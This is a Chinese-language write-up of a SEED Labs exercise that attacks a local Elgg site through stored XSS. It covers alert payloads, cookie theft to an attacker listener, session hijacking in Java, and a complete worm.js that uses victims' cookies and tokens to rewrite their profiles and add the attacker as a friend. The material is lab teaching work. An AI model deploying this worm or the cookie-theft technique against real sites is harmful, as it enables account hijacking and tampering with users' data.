# XSS-Attack

##配置

软件：Vmware Workstation 12 Player

系统：SEEDUbuntu12.04 * 2

网络：NAT

其他：

1. Firefox浏览器(安装好LiveHTTPHeaders插件，用于检查HTTP请求和响应)；
2. Apache网络服务器；
3. Elgg网页应用

###Starting the Apache Server

开启Apache服务器很简单，因为已经预装在SEEDUbuntu中了，只需要使用一下命令开启就行：

![配置](https://raw.githubusercontent.com/familyld/CSRF-Attack/master/graph/image2.png)

### The Elgg Web Application

这是一个开源基于网页的社交应用，同样已经预装在SEEDUbuntu里，并且创建了一些用户，信息如下：

![配置](https://raw.githubusercontent.com/familyld/CSRF-Attack/master/graph/image3.png)

### 配置DNS

这次实验需要用到以上的URL，启动Apache之后就可以在虚拟机内部访问到了，因为在hosts文件中已经配置了这个URL是指向localhost的：

![配置](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image31.png)

### 配置Apache服务器
实验中使用Apache服务器作为网站的host，借助name-based virtual hosting技术，可以在同一台主机上host多个网站。配置文件default在/etc/apache2/sites-available/路径下：

![配置](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image32.png)

可以看到Apache用的是80端口，每个网站都有一个VirtualHost块，指定网站的URL和对应的资源目录。比如上面这个block，就绑定了[www.XSSLabElgg.com](www.XSSLabElgg.com)和/var/www/XSS/elgg路径，修改该路径下的文件就能改变网站的配置。

##什么是XSS攻击

XSS全称Cross-Site Scripting，是跨站脚本攻击的意思。由于网站设计存在漏洞，攻击者可以在其中插入恶意的脚本代码，当其它用户请求包含了攻击代码的页面内容时，就会发起的脚本攻击。攻击通常会通过这种方式窃取用户的cookie，冒充用户访问网站，达到窃取用户信息、修改用户资料等目的。

### CSRF vs XSS

CSRF需要通过一些诱导手段把用户导向恶意网站，这样如果用户在浏览恶意网站之前浏览了其他网站并且浏览器保留了cookie信息，则用户浏览恶意网站时，攻击者预先编写的恶意脚本就会发动，并且利用浏览器的特性，借助cookie进行伪装，从而骗过服务器端让其接受伪造的请求，达到跨站攻击的目的。

XSS则不需要诱导用户浏览恶意网站，它是直接利用网站设计的漏洞，在网站内置入一段恶意代码(比如攻击者注册一个帐号，然后在profile页中放上恶意代码)，当别的用户浏览攻击者的profile页时，恶意代码会被触发执行，从而让攻击者窃取到用户的信息(比如cookie信息)。

###为什么拿到Cookie后可以冒充用户？

首先理解Cookie的作用，它可以理解为用户登录网站后生成的一个认证凭据，被保存在本地(即客户端)，当用户再次浏览同一网站并发起请求时，Cookie会被附加到请求包中易并发给网站的HTTP Server。一些网站会把用户的帐号和密码等信息存入本地的Cookie中，如果用户没有注销，Cookie就可以一直使用，下次再打开网站时浏览器会自动调用Cookie，这样用户就不需要再次输入登录信息了。 如果Cookie被攻击者利用XSS的手段窃取到了，攻击者就可以冒充用户登录，然后执行所有用户被允许执行的操作，从而盗取或篡改用户数据。

## Posting a Malicious Message to Display an Alert Window

该任务要求把一段简单的JavaScript程序嵌入攻击者的简介中，使得别的用户浏览攻击者的简介时，会弹出一个alert window。实现很简单，直接把下面这行代码填写在Brief description中就可以了：

![XSS1](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image33.png)

如果要实现更强大的功能，代码段就会比较长，而描述字段一般有字数限制，这时我们可以把JavaScript程序单独编写为一个.js代码文件，然后在网站的描述中使用script标签的src属性来引用，这样用户打开攻击者的profile页时，.js文件会被自动触发执行：

![XSS1](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image34.png)

上面代码中的[www.example.com](www.example.com)可以替换为任何其他网页服务器。

这里假设Boby想跟Alice表白，于是他在自己的简介中嵌入了一段JavaScript：

![XSS1](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image35.png)

然后提交更改(注意使用[www.xsslabelgg.com](www.xsslabelgg.com)而非[www.csrflabelgg.com](www.csrflabelgg.com)，否则脚本代码提交时会被识别出并修改为文本段(把script标签修改为p标签)。

![XSS1](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image36.png)

Alice点开Boby的Profile页面时，这段Javascript会被动态加载并执行，这样Boby就顺利完成表白了~

## Posting a Malicious Message to Display Cookies

该任务和Task1类似，只是输出内容变为输出打开Profile页的用户的Cookie。

因为Alice果断没有接受Boby的表白，Boby黑化了，决定吓唬一下Alice，告诉Alice他可以获取到她的隐私信息。简单修改alert window的输出即可：

![XSS2](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image37.png)

![XSS2](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image38.png)

## Stealing Cookies from the Victim’s Machine

该任务是Task2的升级版，因为Task2仅仅是让Cookie信息显示在客户端，攻击者并没有拿到用户的Cookie。要实现这个功能，我们就需要Javascript代码能够把cookie发给攻击者，可以通过发送一个附带着用户Cookie的HTTP请求来实现。具体来说，可以借助img标签的src属性来发起对攻击者机器IP的GET请求，这个请求会在用户打开攻击者profile页面时发出。只要在攻击者机器上捕捉这个HTTP请求包我们就能够得到用户的Cookie了。从实现上来说，实验文件已经提供了编写好的TCP服务器程序，我们可以设置用来监听指定的端口，并且输出监听到的信息。

接续上面的故事，Alice还是没理会Boby。于是Boby狠下心来决定盗取Alice的隐私信息。这里因为Brief description比较短，所以我把代码放在About me字段中。注意IP地址要修改为Boby机器的IP地址，以及引号要符合对称规则。特别地，About me的输入区要转换为源代码格式：

![XSS3](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image39.png)

然后在Boby的机器上(实验中我用了同一台机器)运行提供好的tcp server程序，并且指定端口参数为5555。接下来静候佳音即可：

![XSS3](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image40.png)

这次当Alice打开Boby的profile页是，img标签的GET请求会被触发，并把Alice的Cookie按照我们设定的方式附加到URL后面。这样在tcp server中被监听的5555端口就会收到这个请求了。打印出来可以看到Alice在Elgg站点的Cookie信息。

## Session Hijacking using the Stolen Cookies

该任务要求使用Java编写一个程序，利用盗取到的Cookie冒充用户，把samy添加为好友。注意这个Task需要使用两台主机，用户在主机A登录，攻击者在主机B登录，攻击需要在主机B上进行。特别地，为了保证从主机A和主机B访问的都是同意站点，要在主机B的hosts文件中对站点的ip地址进行修改，使其指向主机A的apache服务器中的[www.xsselgg.com](www.xsselgg.com)站点：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image41.png)

接续上面的故事，Boby拿到Alice的Cookie后不太会用，于是他找到了传说中的黑客老大Samy帮忙：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image42.png)

Samy不管三七二十一决定先让Alice添加自己为好友再说，通过XSS漏洞实现这一点，在CSRF实验中已经提到了在网站内部可以通过Javascript的变量elgg.security.token.__elgg_ts和elgg.security.token.__elgg_token提取出timestamp和token，把它们加入到攻击代码的GET请求中，这样在攻击者的主机监听5555端口时，如果Alice看了Samy的Profile我们就能得到Alice的Cookie，timestamp和token了，有了这三样法宝，就可以为所欲为了~~

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image43.png)

要使用Java构造一个添加好友的GET请求，就要先了解这个请求包的结构，使用Live HTTP Header插件抓包观测，可以得到下图，高亮的部分是我们需要填充到包里面的，其中User-Agent字段修改为Sun JDK 1.6，Cookie字段修改为我们使用TCP server监听到的Alice的Cookie即可：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image44.png)

对应的代码段：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image45.png)

代码骨干已经提供好了，但源代码中只有User-agent字段，我们照样把抓包对应的字段填好就可以了。然后和Task3类似，使用TCP Server抓取GET请求：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image46.png)

得到Alice的Cookie，timestamp以及token，特别注意Cookie中%3D要换为=号，这个对照一下前面Live HTTP Header抓包内容就知道了。依次用抓到的内容填写好代码段对应的部分：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image47.png)

最后编辑java文件，然后执行：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image48.png)

此时返回的会是一个HTML页面，看到Response Code=200就意味着添加好友这个HTTP请求成功了。再回到Alice的页面查看：

![XSS4](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image49.png)

果然黑客老大Samy已经变成了Alice的好友~

## Writing an XSS Worm

该任务要求通过利用XSS漏洞，在攻击者profile中嵌入Javascript代码，从而盗取用户Cookie，继而修改该用户的profile信息并令其添加自己为好友。和Task4不同的主要就是Task5是直接在用户浏览器上完成的，不需要经过攻击者所在的主机。

### Using Ajax

Ajax全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML。可以简单理解为，这是一种可以在不重新加载整个页面的情况下与服务器交换数据并更新部分网页的技术。在这个任务中JavaScript需要发送HTTP请求，我们可以通过使用XMLHttpRequest对象来实现。不仅可以发送GET请求，也能发送POST请求，但这两种请求的构造方式是不同的，具体的我们还是通过Live HTTP Header插件抓包下来观察。另外，由于这次的代码段比较长，所以不再直接填写在攻击者的profile中，而是封装在一个.js文件内，然后profile中的script加载时调用这个.js文件。

继续上面的故事，Alice看到自己突然多了个新好友Samy，十分迷惑，然后就给随手删掉了。这下Samy不爽了，不过他嫌上次实现的方式太麻烦，还得自己看着抓包然后复制粘贴运行，想想都受不了，那要怎么办呢？他灵机一动，决定直接写个XSS蠕虫，这下只要别人看到他的profile就会被逼按他设定的做，而他写好代码之后只需静静地欣赏就可以了~~

由于代码较长，所以这里不再直接写在profile中，而是通过script标签的src属性进行调用：

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image50.png)

这里的[www.example.com](www.example.com)可以是任意一个攻击者掌控的站点，把worm.js(这次编写的代码)放在服务器中对应的资源目录就可以了。这里我们先在Apache服务器中创建这个站点，修改/etc/apache2/sites-available/目录下的default文件：

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image51.png)

加入站点[www.example.com](www.example.com)的配置信息后，再修改/etc/目录下的hosts文件，把[www.example.com](www.example.com)绑定到本地。

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image52.png)

接下来在/var/www/路径下创建Example文件夹，然后在里面放上worm.js就可以了(当然，得先写好worm.js啊摔)。

实验文档里面给出了一个骨干代码段，当然仅仅是骨干而已…我们要做的是根据修改profile动作进行抓包，然后照着样子填好HTTP请求的头部，然后进行发送。

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image53.png)

获取Cookie，timestamp和token的方式和Task4中的Javascript代码一样，都可以直接通过变量名调用，但我们还需要获取一个参数，就是用户名，除了用户名之外profile其他资料都是我们可以修改的~ 怎样获取用户名呢？有两种方法，第一种上学期学移动Web的时候有提到过一下，可以分为以下几个步骤：

1. 用getElementsByID或者getElementsByClassName函数来提取网页元素对象，后者获取到的是一个数组，可以通过下标访问具体的对象。

2. 通过.attributes提取出该对象的属性。

3. 用getNamedItem(“attributeName”).nodeValue提取出具体的属性值。

接下来就是要找到能提取出用户名的元素了，打开Edit profile页面，在Firefox浏览网页源码首先在网页空白处点击右键，然后选择菜单中的View Page Source选项，这时会打开一个显示网页源码的新窗口：

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image54.png)

Ctrl+F调出搜索页面，找到一个符合我们需求的网页元素对象，这段源码（可左右滑动）如下：

```html
<img src="http://www.xsslabelgg.com/mod/profile/icondirect.php?lastcache=1463195865&amp;joindate=1410961457&amp;guid=39&amp;size=topbar" alt="Alice" title="Profile" class="elgg-border-plain elgg-transition"/>
```

这个img对象是调用网页顶部导航栏中用户头像缩略图用的，其中alt属性的值符合我们的需求，非常干净，直接提取出来就可以了，代码如下：

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image55.png)

这个class只有一个元素对象，就是前面的img，所以通过下标0提取出来就可以了，变量user就是我们需要的用户名了。

第二种更简洁，直接使用变量elgg.session.user.username访问就行了~~

整个worm.js代码如下：

```js
var user = elgg.session.user.username;
if(user!='samy'){
    var Ajax=null;
    // Construct the header information for the HTTP request
    Ajax=new XMLHttpRequest();
    if(Ajax==null)
        alert("Ajax is null");
    Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("User-Agent","AJAX 1.2");
    Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");

    Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user+"/edit");

    Ajax.setRequestHeader("Cookie",document.cookie);
    Ajax.setRequestHeader("Connection","keep-alive");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    // Construct the content. The format of the content can be learned
    // from LiveHTTPHeaders.
    var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name="+user+"&description=I'm your father!&guid="+elgg.session.user.guid; // You need to fill in the details.
    // Send the HTTP POST request.
    Ajax.setRequestHeader("Content-Length",content.length);
    Ajax.send(content);
}
```

注意，引用的.js文件中是纯Javascript代码。此外，我们可以使用elgg.session.user.guid来提取出用户的ID，这样就不用像CSRF实验那样还得先添加好友再抓包了。

#### 实验前

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image56.png)

#### 实验后

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image57.png)

Alice的Profile被清空了~只留下来自Samy的恶意 I‘m your father！

至于添加为好友的实现方式，也是类似的，观察GET请求包：

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image58.png)

也是依次填充好XMLHttpRequest的各个字段，然后发送：

```js
var Ajax2=null;
// Construct the header information for the HTTP request
Ajax2=new XMLHttpRequest();
if(Ajax2==null)
    alert("Ajax2 is null");
    Ajax2.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"42"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
Ajax2.setRequestHeader("User-Agent","Ajax2 1.2");
    Ajax2.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
Ajax2.setRequestHeader("Accept-Language","en-US,en;q=0.5");
Ajax2.setRequestHeader("Accept-Encoding","gzip, deflate");
    Ajax2.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");

Ajax2.setRequestHeader("Cookie",document.cookie);
Ajax2.setRequestHeader("Connection","keep-alive");
// Send the HTTP POST request.
Ajax2.send();
```

GET的不同在于参数直接附加在GET请求的URL尾部，注意这里friend参数是Samy的guid，也即42，而后面的timestamp和token则来自访问Samy profile页的用户。特别地，GET请求没有content，所以最后不需要计算content长度，send函数里面也不需要放上content。

![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image59.png)

可以看到Samy果然又被Alice加上了~~


